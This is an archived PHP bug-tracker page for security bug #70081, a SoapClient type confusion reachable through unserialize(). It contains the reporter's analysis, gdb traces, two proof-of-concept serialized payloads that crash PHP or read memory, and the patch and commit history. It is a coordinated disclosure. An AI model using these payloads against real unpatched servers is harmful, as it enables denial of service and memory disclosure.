<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #70081 - RDF' href='rss/bug.php?id=70081'>
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #70081 - RSS 2.0' href='rss/bug.php?id=70081&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #70081 :: SoapClient info leak / null pointer dereference via multiple type confusions</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=70081">Sec Bug</a>&nbsp;#70081</th>
            <td id="summary" colspan="5">SoapClient info leak / null pointer dereference via multiple type confusions</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2015-07-15 11:41 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2015-08-04 22:20 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</td>
            <th class="details">Assigned:</th>
            <td></td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=SOAP+related">SOAP related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>Irrelevant</td>
            <th class="details">OS:</th>
            <td>Ubuntu x86_64</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><em>None</em></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=70081&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=70081&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=70081&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1436960517">&nbsp;</a><strong>[2015-07-15 11:41 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
<pre class='note'>Description:
------------
OVERVIEW

SoapClient's __call() method suffers from multiple type confusion issues which could be used to exfiltrate arbitrary memory contents or cause crashe via unsafe unserialize() calls.

DETAILS

The first problem lies how zend_hash_get_current_key is called in php_http.c:826

zend_hash_get_current_key_ex(Z_ARRVAL_PP(cookies), &amp;key, &amp;key_len, NULL, 0, NULL);

here a wrong assumption is made about key always being a **char, in fact, this is not true when unserializing a SoapClient object crafted with a numerically indexed array as _cookies.
The scenario mentioned above would then result in a null pointer dereference occuring in zend_hash_get_current_key(), zend_hash.c, line 1088.

*num_index = p-&gt;h;

where num_index is the NULL passed as 4th argument, and p-&gt;h a user-controlled value. While remotely this will always lead to a crash attempting to dereference 0x0, locally, if memory mapping is possible, this could be used to get arbitrary memory write and most likely code execution.

poc #1

gdb$ r poc1.php
Starting program: /usr/bin/php5 ./xplua/poc1sop.php
Program received signal SIGSEGV, Segmentation fault.

0x00000000006eabb5 in zend_hash_get_current_key_ex (ht=0x7ffff7fc0670, str_index=str_index@entry=0x7fffffff7860, str_length=str_length@entry=0x7fffffff77bc, num_index=num_index@entry=0x0, duplicate=duplicate@entry=0x0, pos=pos@entry=0x0) at /build/php5-RvVZKb/php5-5.6.10+dfsg/Zend/zend_hash.c:1088
1088				*num_index = p-&gt;h;
gdb$ p num_index
$132 = (ulong *) 0x0
gdb$ p p-&gt;h
$133 = 0x539

Second problem is a few lines later, php_http.c:833

    zval **tmp;
834                          if ((zend_hash_index_find(Z_ARRVAL_PP(data), 1, (void**)&amp;tmp) == FAILURE ||
835                               strncmp(phpurl-&gt;path?phpurl-&gt;path:&quot;/&quot;,Z_STRVAL_PP(tmp),Z_STRLEN_PP(tmp)) == 0) &amp;&amp;
836                              (zend_hash_index_find(Z_ARRVAL_PP(data), 2, (void**)&amp;tmp) == FAILURE ||
837                               in_domain(phpurl-&gt;host,Z_STRVAL_PP(tmp))) &amp;&amp;
838                              (use_ssl || zend_hash_index_find(Z_ARRVAL_PP(data), 3, (void**)&amp;tmp) == FAILURE)) {
839                                smart_str_appendl(&amp;soap_headers, key, key_len-1);
840                                smart_str_appendc(&amp;soap_headers, '=');
841                                smart_str_appendl(&amp;soap_headers, Z_STRVAL_PP(value), Z_STRLEN_PP(value));
842                                smart_str_appendc(&amp;soap_headers, ';');
843                            }
844                        }

In the code portion above basically every Z_* call leads to a type confusion, no type checks are ever performed on tmp.

#poc 2

gdb$ r poc2.php

Program received signal SIGSEGV, Segmentation fault.

make_http_soap_request (this_ptr=this_ptr@entry=0x7ffff7fc0028, buf=&lt;optimized out&gt;, buf_size=&lt;optimized out&gt;, location=&lt;optimized out&gt;, soapaction=&lt;optimized out&gt;, soap_version=&lt;optimized out&gt;, buffer=buffer@entry=0x7ffff7fc0ce8, buffer_len=buffer_len@entry=0x7ffff7fc0cf0) at /build/php5-RvVZKb/php5-5.6.10+dfsg/ext/soap/php_http.c:837
837							       in_domain(phpurl-&gt;host,Z_STRVAL_PP(tmp))) &amp;&amp;
gdb$ x/i $pc
=&gt; 0x59ebb9 &lt;make_http_soap_request+17369&gt;:	cmp    BYTE PTR [r12],0x2e
gdb$ p $r12
$164 = 0x539

Besides the crashes triggerable making tmp a numeric typed zval, arbitrary memory addresses exfiltration is also possible, even if the content is never reflected to the outside.
An attacker could in fact rely on the in_domain()'s strcmp() output to search for arbitrary strings in memory starting from a given address.
Considering that the first parameter needs to be a valid host, a remote exploitation is possible with a very limited set of strings (hostnames, numeric values corresponding to valid encoding for a reachable ip address, etc.).
Using zval types other than int, it might be possible to exploit the strncmp at line 835, where having path instead of host as first parameter would give the attacker a considerably wider string set. I'm still digging in that direction to see if reliable exploitation is achievable and I will let you know if something comes up.

regards,
Andrea

Test script:
---------------
#poc1

&lt;?php

//segfault on write access violation @0

$dummy = unserialize('O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:1:&quot;a&quot;;s:8:&quot;location&quot;;s:22:&quot;<a href="http://localhost/a.xml&quot;;s:8:&quot;_cookies&quot;;a:1:{i:1337;s:12:&quot;not-a-string&quot;;}}'" rel="nofollow">http://localhost/a.xml&quot;;s:8:&quot;_cookies&quot;;a:1:{i:1337;s:12:&quot;not-a-string&quot;;}}'</a>);
var_dump($dummy-&gt;notexisting());

?&gt;

#poc2

&lt;?php

//segfault on read access violation @1337

$dummy = unserialize('O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:1:&quot;a&quot;;s:8:&quot;location&quot;;s:26:&quot;<a href="http://pwn.badoo.com/a.xml&quot;;s:8:&quot;_cookies&quot;;a:1:{s:3:&quot;AAA&quot;;a:3:{i:0;s:1:&quot;a&quot;;i:2;i:1337;i:1;i:1338;}}}'" rel="nofollow">http://pwn.badoo.com/a.xml&quot;;s:8:&quot;_cookies&quot;;a:1:{s:3:&quot;AAA&quot;;a:3:{i:0;s:1:&quot;a&quot;;i:2;i:1337;i:1;i:1338;}}}'</a>);
var_dump($dummy-&gt;notexisting());

?&gt;



</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=70081&amp;patch=bug70081&amp;revision=latest" >bug70081</a>
(last revision 2015-07-26 23:45 UTC by stas@php.net)
<br><p><a href='patch-add.php?bug_id=70081'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=70081'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1436962761">&nbsp;</a><strong>[2015-07-15 12:19 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type:           Bug</span>
<span class="added">+Type:           Security</span>
<span class="removed">-Private report: No</span>
<span class="added">+Private report: Yes</span>
</div></div></div><div class='comment type_comment' ><a name="1436962761">&nbsp;</a><strong>[2015-07-15 12:19 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
<pre class='note'>Forgot to make it private
</pre>
</div><div class='comment type_comment' ><a name="1437765578">&nbsp;</a><strong>[2015-07-24 19:19 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
<pre class='note'>Further investigations revealed that the restrictions imposed by the nature of the host parameter could be bypassed using __proxy_host and __proxy_port.
Combined with #70121, this gives an attacker the ability to read arbitrary memory through whichever user-controlled unserialize call.
I'm going to develop and provide you a working PoC demonstrating the full exploitation in the next few days.

Please get back to me to coordinate disclosure and cve request as soon as you are ready to proceed.
Regards,
Andrea
</pre>
</div><div class='comment type_patch' ><a name="1437954332">&nbsp;</a><strong>[2015-07-26 23:45 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: bug70081
Revision:   1437954332
URL:        <a href="https://bugs.php.net/patch-display.php?bug=70081&amp;patch=bug70081&amp;revision=1437954332" rel="nofollow">https://bugs.php.net/patch-display.php?bug=70081&amp;patch=bug70081&amp;revision=1437954332</a>
</pre>
</div><div class='comment type_comment' ><a name="1437954644">&nbsp;</a><strong>[2015-07-26 23:50 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Please check the patch at <a href="https://gist.github.com/smalyshev/66cde7a0d9aee8b84814" rel="nofollow">https://gist.github.com/smalyshev/66cde7a0d9aee8b84814</a>
</pre>
</div><div class='comment type_comment' ><a name="1438583678">&nbsp;</a><strong>[2015-08-03 06:34 UTC] <a href="//people.php.net/dmitry">dmitry@php.net</a></strong>
<pre class='note'>looks fine
</pre>
</div><div class='comment type_comment' ><a name="1438594748">&nbsp;</a><strong>[2015-08-03 09:39 UTC] andrea &#x64;&#111;&#x74; palazzo &#x61;&#116; truel &#x64;&#111;&#x74; it</strong>
<pre class='note'>Yes, I can confirm that the patch is fixing both the issues
</pre>
</div><div class='comment type_svn' ><a name="1438726952">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69</a>
Log: Fix <a href='bug.php?id=70081'>bug #70081</a>: check types for SOAP variables
</pre>
</div><div class='comment type_log' ><a name="1438726953">&nbsp;</a><strong>[2015-08-04 22:22 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1438727019">&nbsp;</a><strong>[2015-08-04 22:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69</a>
Log: Fix <a href='bug.php?id=70081'>bug #70081</a>: check types for SOAP variables
</pre>
</div><div class='comment type_svn' ><a name="1438727415">&nbsp;</a><strong>[2015-08-04 22:30 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69</a>
Log: Fix <a href='bug.php?id=70081'>bug #70081</a>: check types for SOAP variables
</pre>
</div><div class='comment type_svn' ><a name="1438759777">&nbsp;</a><strong>[2015-08-05 07:29 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69</a>
Log: Fix <a href='bug.php?id=70081'>bug #70081</a>: check types for SOAP variables
</pre>
</div><div class='comment type_svn' ><a name="1438769551">&nbsp;</a><strong>[2015-08-05 10:12 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c96d08b27226193dd51f2b50e84272235c6aaa69</a>
Log: Fix <a href='bug.php?id=70081'>bug #70081</a>: check types for SOAP variables
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
